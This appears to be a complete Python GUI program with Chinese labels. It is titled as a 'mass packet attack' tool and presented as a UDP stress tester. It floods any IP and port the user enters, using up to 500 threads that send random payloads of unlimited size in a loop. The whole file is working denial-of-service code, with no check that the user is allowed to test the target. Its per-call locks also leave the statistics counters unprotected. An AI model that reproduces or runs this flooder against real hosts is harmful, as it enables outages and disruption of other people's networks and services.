import threading
import socket
import time
import os
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext

class UDPFloodTesterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("大量数据包攻击")
        self.running = False
        
        # 初始化默认参数
        self.default_values = {
            'target_ip': '127.0.0.1',
            'target_port': 12345,
            'thread_count': 20,
            'packet_size': 65507
        }
        
        # 初始化统计变量
        self.stats = {
            'success': 0,
            'failed': 0,
            'start_time': 0,
            'total_bytes': 0
        }
        
        self.setup_ui()
        self.set_default_values()
        
    def setup_ui(self):
        """设置图形用户界面"""
        # 主框架
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 输入参数区域
        input_frame = ttk.LabelFrame(main_frame, text="测试参数", padding="10")
        input_frame.pack(fill=tk.X, pady=5)
        
        # 目标IP
        ttk.Label(input_frame, text="目标IP:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.ip_entry = ttk.Entry(input_frame)
        self.ip_entry.grid(row=0, column=1, sticky=tk.EW, padx=5, pady=2)
        
        # 目标端口
        ttk.Label(input_frame, text="目标端口:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.port_entry = ttk.Entry(input_frame)
        self.port_entry.grid(row=1, column=1, sticky=tk.EW, padx=5, pady=2)
        
        # 线程数
        ttk.Label(input_frame, text="线程数:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        self.thread_spin = ttk.Spinbox(input_frame, from_=1, to=500, increment=1)
        self.thread_spin.grid(row=2, column=1, sticky=tk.EW, padx=5, pady=2)
        
        # 包大小（移除了最大值限制）
        ttk.Label(input_frame, text="包大小(字节):").grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        self.packet_spin = ttk.Spinbox(input_frame, from_=1, to=2147483647, increment=100)  # 理论上限2GB
        self.packet_spin.grid(row=3, column=1, sticky=tk.EW, padx=5, pady=2)
        
        # 按钮区域
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=5)
        
        self.start_btn = ttk.Button(button_frame, text="开始测试", command=self.start_test)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(button_frame, text="停止测试", command=self.stop_test, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="退出", command=self.root.quit).pack(side=tk.RIGHT, padx=5)
        
        # 日志区域
        log_frame = ttk.LabelFrame(main_frame, text="测试日志", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_area = scrolledtext.ScrolledText(log_frame, height=15, wrap=tk.WORD)
        self.log_area.pack(fill=tk.BOTH, expand=True)
        
        # 统计信息区域
        stats_frame = ttk.Frame(main_frame)
        stats_frame.pack(fill=tk.X, pady=5)
        
        self.stats_label = ttk.Label(stats_frame, text="准备就绪...")
        self.stats_label.pack()
        
        # 配置网格权重
        input_frame.columnconfigure(1, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(3, weight=1)
        
    def set_default_values(self):
        """设置默认参数值"""
        self.ip_entry.delete(0, tk.END)
        self.ip_entry.insert(0, self.default_values['target_ip'])
        
        self.port_entry.delete(0, tk.END)
        self.port_entry.insert(0, self.default_values['target_port'])
        
        self.thread_spin.delete(0, tk.END)
        self.thread_spin.insert(0, self.default_values['thread_count'])
        
        self.packet_spin.delete(0, tk.END)
        self.packet_spin.insert(0, self.default_values['packet_size'])
    
    def log(self, message):
        """记录日志信息"""
        timestamp = time.strftime("%H:%M:%S")
        self.log_area.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_area.see(tk.END)
        self.root.update()
    
    def start_test(self):
        """开始压力测试"""
        try:
            # 获取输入参数
            target_ip = self.ip_entry.get()
            target_port = int(self.port_entry.get())
            thread_count = int(self.thread_spin.get())
            packet_size = int(self.packet_spin.get())
            
            # 基本参数验证
            if not target_ip or target_port < 1 or target_port > 65535:
                messagebox.showerror("错误", "请输入有效的IP和端口(1-65535)")
                return
            
            if packet_size < 1:
                messagebox.showerror("错误", "包大小必须大于0字节")
                return
            
            # 大包警告提示
            if packet_size > 65507:  # 超过标准UDP最大负载
                if not messagebox.askyesno("警告", 
                    f"您设置的包大小({packet_size}字节)超过标准UDP最大负载(65507字节)\n"
                    "这可能导致数据被分片或丢弃，是否继续?"):
                    return
            
            # 初始化统计
            self.stats = {
                'success': 0,
                'failed': 0,
                'start_time': time.time(),
                'total_bytes': 0
            }
            
            self.log(f"开始UDP压力测试 -> {target_ip}:{target_port}")
            self.log(f"线程数: {thread_count} | 包大小: {packet_size}字节")
            
            # 更新按钮状态
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            self.running = True
            
            # 创建线程池
            self.executor = ThreadPoolExecutor(max_workers=thread_count)
            
            # 启动工作线程
            for _ in range(thread_count):
                self.executor.submit(self.worker_thread, target_ip, target_port, packet_size)
            
            # 启动统计更新线程
            threading.Thread(target=self.update_stats, daemon=True).start()
            
        except ValueError as e:
            messagebox.showerror("错误", f"参数错误: {str(e)}")
    
    def worker_thread(self, target_ip, target_port, packet_size):
        """工作线程函数"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            # 动态调整发送缓冲区大小
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, packet_size)
            
            # 生成测试数据包
            packet = os.urandom(packet_size)
            
            while self.running:
                try:
                    sock.sendto(packet, (target_ip, target_port))
                    with threading.Lock():
                        self.stats['success'] += 1
                        self.stats['total_bytes'] += packet_size
                except socket.error as e:
                    # 特殊处理大包发送错误
                    if "Message too long" in str(e):
                        self.log(f"错误: 包大小{packet_size}超过系统限制，尝试减小包大小")
                        break
                    with threading.Lock():
                        self.stats['failed'] += 1
                except Exception as e:
                    with threading.Lock():
                        self.stats['failed'] += 1
        finally:
            sock.close()
    
    def update_stats(self):
        """更新统计信息"""
        while self.running:
            elapsed = max(1, time.time() - self.stats['start_time'])
            with threading.Lock():
                success = self.stats['success']
                failed = self.stats['failed']
                total_bytes = self.stats['total_bytes']
                
                stats_text = (
                    f"成功: {success} | 失败: {failed} | "
                    f"速率: {success/elapsed:.2f} pkt/s | "
                    f"带宽: {total_bytes/elapsed/1024/1024:.2f} MB/s"
                )
                
                self.stats_label.config(text=stats_text)
            
            time.sleep(1)
    
    def stop_test(self):
        """停止压力测试"""
        self.running = False
        self.log("正在停止测试...")
        
        if hasattr(self, 'executor'):
            self.executor.shutdown(wait=False)
        
        # 更新按钮状态
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        
        # 显示最终统计
        elapsed = time.time() - self.stats['start_time']
        self.log(f"测试已停止，总运行时间: {elapsed:.2f}秒")
        self.log(f"最终统计: {self.stats_label.cget('text')}")

if __name__ == "__main__":
    root = tk.Tk()
    
    # 设置窗口大小和最小尺寸
    root.geometry("800x600")
    root.minsize(600, 400)
    
    # 设置样式
    style = ttk.Style()
    style.configure('TFrame', background='#f0f0f0')
    style.configure('TLabel', background='#f0f0f0')
    style.configure('TButton', padding=5)
    
    app = UDPFloodTesterGUI(root)
    root.mainloop()
